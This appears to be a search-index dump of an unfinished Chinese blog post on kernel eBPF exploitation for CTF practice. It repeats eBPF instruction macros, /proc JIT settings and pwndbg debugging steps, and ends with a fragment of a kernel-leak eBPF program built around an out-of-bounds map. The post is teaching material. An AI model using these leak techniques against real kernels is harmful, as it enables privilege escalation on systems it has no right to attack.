imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_reg) * BPF_CMPXCHG r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg) */ #define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = OP }) /* Legacy alias */ #define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:7","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#内存读写类"},{"categories":["pwn"],"collections":null,"content":"指令编写\r在内核源码目录中定义了samples/bpf/bpf_insn.h，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多 使用的时候，include进去即可。（这里加了个BPF_CALL_FUNC） /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */ \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_reg) * BPF_CMPXCHG r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg) */ #define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = OP }) /* Legacy alias */ #define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:7","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#跳转指令"},{"categories":["pwn"],"collections":null,"content":"指令编写\r在内核源码目录中定义了samples/bpf/bpf_insn.h，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多 使用的时候，include进去即可。（这里加了个BPF_CALL_FUNC） /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */ \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_reg) * BPF_CMPXCHG r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg) */ #define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = OP }) /* Legacy alias */ #define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:7","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#其他指令"},{"categories":["pwn"],"collections":null,"content":"proc接口\r/proc/sys/net/core/bpf_jit_enable 可以检查 bpf 能不能被 JIT Values: 0 - disable the JIT (default value) 1 - enable the JIT 2 - enable the JIT and ask the compiler to emit traces on kernel log. /proc/sys/kernel/unprivileged_bpf_disabled 可以检查是否能执行 Values: 0 - Unprivileged calls to bpf() are enabled 1 - Unprivileged calls to bpf() are disabled without recovery 2 - Unprivileged calls to bpf() are disabled ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:8","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#proc接口"},{"categories":["pwn"],"collections":null,"content":"调试\r查结构体\r在分配一个array类型的map的时候（ebpf pwn中我们通常都使用type为array的map），会调用函数array_map_alloc（路径：/kernel/bpf/arraymap.c）分配struct bpf_array这个函数： 调用函数 bpf_map_area_alloc，分配struct bpf_array 返回\u0026array-\u003emap，也就是返回bpf_array的struct bpf_map，array的首地址 0xffffffff9b5d4d37 \u003carray_map_alloc+151\u003e: mov BYTE PTR [rbp-0x2d],r8b 0xffffffff9b5d4d3b \u003carray_map_alloc+155\u003e: call 0xffffffff9b595030 \u003cbpf_map_area_alloc\u003e 0xffffffff9b5d4d40 \u003carray_map_alloc+160\u003e: movzx r8d,BYTE PTR [rbp-0x2d] fin这个函数后还没有分配struct bpf_map中的ops，会在这个函数的上层函数__do_sys_bpf中设置ops字段 ops只有一个，不同的bpf_map都指向同一个ops 调试命令： b array_map_alloc c fin set $array1 = $rax 实际执行bpf程序\r这里的内核版本是6.12.47 断在sk_filter_trim_cap中， 0xffffffffb3da8d37 \u003csk_filter_trim_cap+151\u003e: mov rdi,rbx 0xffffffffb3da8d3a \u003csk_filter_trim_cap+154\u003e: call 0xffffffffb3f6a940 \u003c__x86_indirect_thunk_rax\u003e 0xffffffffb3da8d3f \u003csk_filter_trim_cap+159\u003e: mov r15d,eax 当程序停在 0xffffffffb3da8d3a 时，这个指令就是call rax。此时 RAX 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。 pwndbg\u003e p/x $rip $8 = 0xffffffffb3da8d3a pwndbg\u003e i r rax rax 0xffffffffc022566c -1071491476 pwndbg\u003e vmmap 0xffffffffc022566c LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File (set vmmap-prefer-relpaths on) 0xffffffffb49a3000 0xffffffffb4e00000 rw-p 45d000 462000 kernel [.bss] ► 0xffffffffc0225000 0xffffffffc0425000 r-xp 200000 0 kernel [.driver .bpf] +0x66c pwndbg\u003e 按s步入之后，就是在执行bpf程序了 我这里的程序能对应上： pwndbg\u003e p/x $rip $9 = 0xffffffffc022566c pwndbg\u003e x/30i 0xffffffffc022566c =\u003e 0xffffffffc022566c: endbr64 0xffffffffc0225670: nop DWORD PTR [rax+rax*1+0x0] 0xffffffffc0225675: nop DWORD PTR [rax] 0xffffffffc0225678: push rbp 0xffffffffc0225679: mov rbp,rsp 0xffffffffc022567c: endbr64 0xffffffffc0225680: sub rsp,0x8 0xffffffffc0225687: push rbx 0xffffffffc0225688: push r13 0xffffffffc022568a: push r14 0xffffffffc022568c: push r15 0xffffffffc022568e: xor eax,eax #BPF_MOV64_IMM(BPF_REG_0, 0), 0xffffffffc0225690: mov edi,0x63626160 #BPF_MOV64_IMM(BPF_REG_1, test), 0xffffffffc0225695: mov DWORD PTR [rbp-0x4],eax #BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), 0xffffffffc0225698: lfence 0xffffffffc022569b: mov rbx,rdi #BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), 0xffffffffc022569e: movabs rdi,0xffffa2eb81e43000 #BPF_LD_MAP_FD(BPF_REG_1, oob_map), 0xffffffffc02256a8: mov rsi,rbp #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), 0xffffffffc02256ab: add rsi,0xfffffffffffffffc #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), 0xffffffffc02256af: add rdi,0xf8 0xffffffffc02256b6: mov eax,DWORD PTR [rsi+0x0] 0xffffffffc02256b9: cmp rax,0x1 0xffffffffc02256bd: jae 0xffffffffc02256ce 0xffffffffc02256bf: and eax,0x0 0xffffffffc02256c2: imul rax,rax,0x150 0xffffffffc02256c9: add rax,rdi 0xffffffffc02256cc: jmp 0xffffffffc02256d0 0xffffffffc02256ce: xor eax,eax 0xffffffffc02256d0: test rax,rax 0xffffffffc02256d3: jne 0xffffffffc02256de size_t test = 0; memcpy(\u0026test, \"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\", 8); struct bpf_insn kleak_prog[] = { // load map_ptr_or_null in BPF_REG_0 BPF_MOV64_IMM(BPF_REG_0, 0), BPF_MOV64_IMM(BPF_REG_1, test), BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), BPF_LD_MAP_FD(BPF_REG_1, oob_map), BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map) pwndbg\rpwndbg有一个命令kbpf，但是题目编译的内核一般用不了这个命令，少了点东西。。。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:9","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#调试"},{"categories":["pwn"],"collections":null,"content":"调试\r查结构体\r在分配一个array类型的map的时候（ebpf pwn中我们通常都使用type为array的map），会调用函数array_map_alloc（路径：/kernel/bpf/arraymap.c）分配struct bpf_array这个函数： 调用函数 bpf_map_area_alloc，分配struct bpf_array 返回\u0026array-\u003emap，也就是返回bpf_array的struct bpf_map，array的首地址 0xffffffff9b5d4d37 : mov BYTE PTR [rbp-0x2d],r8b 0xffffffff9b5d4d3b : call 0xffffffff9b595030 0xffffffff9b5d4d40 : movzx r8d,BYTE PTR [rbp-0x2d] fin这个函数后还没有分配struct bpf_map中的ops，会在这个函数的上层函数__do_sys_bpf中设置ops字段 ops只有一个，不同的bpf_map都指向同一个ops 调试命令： b array_map_alloc c fin set $array1 = $rax 实际执行bpf程序\r这里的内核版本是6.12.47 断在sk_filter_trim_cap中， 0xffffffffb3da8d37 : mov rdi,rbx 0xffffffffb3da8d3a : call 0xffffffffb3f6a940 \u003c__x86_indirect_thunk_rax\u003e 0xffffffffb3da8d3f : mov r15d,eax 当程序停在 0xffffffffb3da8d3a 时，这个指令就是call rax。此时 RAX 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。 pwndbg\u003e p/x $rip $8 = 0xffffffffb3da8d3a pwndbg\u003e i r rax rax 0xffffffffc022566c -1071491476 pwndbg\u003e vmmap 0xffffffffc022566c LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File (set vmmap-prefer-relpaths on) 0xffffffffb49a3000 0xffffffffb4e00000 rw-p 45d000 462000 kernel [.bss] ► 0xffffffffc0225000 0xffffffffc0425000 r-xp 200000 0 kernel [.driver .bpf] +0x66c pwndbg\u003e 按s步入之后，就是在执行bpf程序了 我这里的程序能对应上： pwndbg\u003e p/x $rip $9 = 0xffffffffc022566c pwndbg\u003e x/30i 0xffffffffc022566c =\u003e 0xffffffffc022566c: endbr64 0xffffffffc0225670: nop DWORD PTR [rax+rax*1+0x0] 0xffffffffc0225675: nop DWORD PTR [rax] 0xffffffffc0225678: push rbp 0xffffffffc0225679: mov rbp,rsp 0xffffffffc022567c: endbr64 0xffffffffc0225680: sub rsp,0x8 0xffffffffc0225687: push rbx 0xffffffffc0225688: push r13 0xffffffffc022568a: push r14 0xffffffffc022568c: push r15 0xffffffffc022568e: xor eax,eax #BPF_MOV64_IMM(BPF_REG_0, 0), 0xffffffffc0225690: mov edi,0x63626160 #BPF_MOV64_IMM(BPF_REG_1, test), 0xffffffffc0225695: mov DWORD PTR [rbp-0x4],eax #BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), 0xffffffffc0225698: lfence 0xffffffffc022569b: mov rbx,rdi #BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), 0xffffffffc022569e: movabs rdi,0xffffa2eb81e43000 #BPF_LD_MAP_FD(BPF_REG_1, oob_map), 0xffffffffc02256a8: mov rsi,rbp #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), 0xffffffffc02256ab: add rsi,0xfffffffffffffffc #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), 0xffffffffc02256af: add rdi,0xf8 0xffffffffc02256b6: mov eax,DWORD PTR [rsi+0x0] 0xffffffffc02256b9: cmp rax,0x1 0xffffffffc02256bd: jae 0xffffffffc02256ce 0xffffffffc02256bf: and eax,0x0 0xffffffffc02256c2: imul rax,rax,0x150 0xffffffffc02256c9: add rax,rdi 0xffffffffc02256cc: jmp 0xffffffffc02256d0 0xffffffffc02256ce: xor eax,eax 0xffffffffc02256d0: test rax,rax 0xffffffffc02256d3: jne 0xffffffffc02256de size_t test = 0; memcpy(\u0026test, \"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\", 8); struct bpf_insn kleak_prog[] = { // load map_ptr_or_null in BPF_REG_0 BPF_MOV64_IMM(BPF_REG_0, 0), BPF_MOV64_IMM(BPF_REG_1, test), BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), BPF_LD_MAP_FD(BPF_REG_1, oob_map), BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map) pwndbg\rpwndbg有一个命令kbpf，但是题目编译的内核一般用不了这个命令，少了点东西。。。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:9","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#查结构体"},{"categories":["pwn"],"collections":null,"content":"调试\r查结构体\r在分配一个array类型的map的时候（ebpf pwn中我们通常都使用type为array的map），会调用函数array_map_alloc（路径：/kernel/bpf/arraymap.c）分配struct bpf_array这个函数： 调用函数 bpf_map_area_alloc，分配struct bpf_array 返回\u0026array-\u003emap，也就是返回bpf_array的struct bpf_map，array的首地址 0xffffffff9b5d4d37 : mov BYTE PTR [rbp-0x2d],r8b 0xffffffff9b5d4d3b : call 0xffffffff9b595030 0xffffffff9b5d4d40 : movzx r8d,BYTE PTR [rbp-0x2d] fin这个函数后还没有分配struct bpf_map中的ops，会在这个函数的上层函数__do_sys_bpf中设置ops字段 ops只有一个，不同的bpf_map都指向同一个ops 调试命令： b array_map_alloc c fin set $array1 = $rax 实际执行bpf程序\r这里的内核版本是6.12.47 断在sk_filter_trim_cap中， 0xffffffffb3da8d37 : mov rdi,rbx 0xffffffffb3da8d3a : call 0xffffffffb3f6a940 \u003c__x86_indirect_thunk_rax\u003e 0xffffffffb3da8d3f : mov r15d,eax 当程序停在 0xffffffffb3da8d3a 时，这个指令就是call rax。此时 RAX 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。 pwndbg\u003e p/x $rip $8 = 0xffffffffb3da8d3a pwndbg\u003e i r rax rax 0xffffffffc022566c -1071491476 pwndbg\u003e vmmap 0xffffffffc022566c LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File (set vmmap-prefer-relpaths on) 0xffffffffb49a3000 0xffffffffb4e00000 rw-p 45d000 462000 kernel [.bss] ► 0xffffffffc0225000 0xffffffffc0425000 r-xp 200000 0 kernel [.driver .bpf] +0x66c pwndbg\u003e 按s步入之后，就是在执行bpf程序了 我这里的程序能对应上： pwndbg\u003e p/x $rip $9 = 0xffffffffc022566c pwndbg\u003e x/30i 0xffffffffc022566c =\u003e 0xffffffffc022566c: endbr64 0xffffffffc0225670: nop DWORD PTR [rax+rax*1+0x0] 0xffffffffc0225675: nop DWORD PTR [rax] 0xffffffffc0225678: push rbp 0xffffffffc0225679: mov rbp,rsp 0xffffffffc022567c: endbr64 0xffffffffc0225680: sub rsp,0x8 0xffffffffc0225687: push rbx 0xffffffffc0225688: push r13 0xffffffffc022568a: push r14 0xffffffffc022568c: push r15 0xffffffffc022568e: xor eax,eax #BPF_MOV64_IMM(BPF_REG_0, 0), 0xffffffffc0225690: mov edi,0x63626160 #BPF_MOV64_IMM(BPF_REG_1, test), 0xffffffffc0225695: mov DWORD PTR [rbp-0x4],eax #BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), 0xffffffffc0225698: lfence 0xffffffffc022569b: mov rbx,rdi #BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), 0xffffffffc022569e: movabs rdi,0xffffa2eb81e43000 #BPF_LD_MAP_FD(BPF_REG_1, oob_map), 0xffffffffc02256a8: mov rsi,rbp #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), 0xffffffffc02256ab: add rsi,0xfffffffffffffffc #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), 0xffffffffc02256af: add rdi,0xf8 0xffffffffc02256b6: mov eax,DWORD PTR [rsi+0x0] 0xffffffffc02256b9: cmp rax,0x1 0xffffffffc02256bd: jae 0xffffffffc02256ce 0xffffffffc02256bf: and eax,0x0 0xffffffffc02256c2: imul rax,rax,0x150 0xffffffffc02256c9: add rax,rdi 0xffffffffc02256cc: jmp 0xffffffffc02256d0 0xffffffffc02256ce: xor eax,eax 0xffffffffc02256d0: test rax,rax 0xffffffffc02256d3: jne 0xffffffffc02256de size_t test = 0; memcpy(\u0026test, \"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\", 8); struct bpf_insn kleak_prog[] = { // load map_ptr_or_null in BPF_REG_0 BPF_MOV64_IMM(BPF_REG_0, 0), BPF_MOV64_IMM(BPF_REG_1, test), BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), BPF_LD_MAP_FD(BPF_REG_1, oob_map), BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map) pwndbg\rpwndbg有一个命令kbpf，但是题目编译的内核一般用不了这个命令，少了点东西。。。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:9","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#实际执行bpf程序"},{"categories":["pwn"],"collections":null,"content":"调试\r查结构体\r在分配一个array类型的map的时候（ebpf pwn中我们通常都使用type为array的map），会调用函数array_map_alloc（路径：/kernel/bpf/arraymap.c）分配struct bpf_array这个函数： 调用函数 bpf_map_area_alloc，分配struct bpf_array 返回\u0026array-\u003emap，也就是返回bpf_array的struct bpf_map，array的首地址 0xffffffff9b5d4d37 : mov BYTE PTR [rbp-0x2d],r8b 0xffffffff9b5d4d3b : call 0xffffffff9b595030 0xffffffff9b5d4d40 : movzx r8d,BYTE PTR [rbp-0x2d] fin这个函数后还没有分配struct bpf_map中的ops，会在这个函数的上层函数__do_sys_bpf中设置ops字段 ops只有一个，不同的bpf_map都指向同一个ops 调试命令： b array_map_alloc c fin set $array1 = $rax 实际执行bpf程序\r这里的内核版本是6.12.47 断在sk_filter_trim_cap中， 0xffffffffb3da8d37 : mov rdi,rbx 0xffffffffb3da8d3a : call 0xffffffffb3f6a940 \u003c__x86_indirect_thunk_rax\u003e 0xffffffffb3da8d3f : mov r15d,eax 当程序停在 0xffffffffb3da8d3a 时，这个指令就是call rax。此时 RAX 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。 pwndbg\u003e p/x $rip $8 = 0xffffffffb3da8d3a pwndbg\u003e i r rax rax 0xffffffffc022566c -1071491476 pwndbg\u003e vmmap 0xffffffffc022566c LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File (set vmmap-prefer-relpaths on) 0xffffffffb49a3000 0xffffffffb4e00000 rw-p 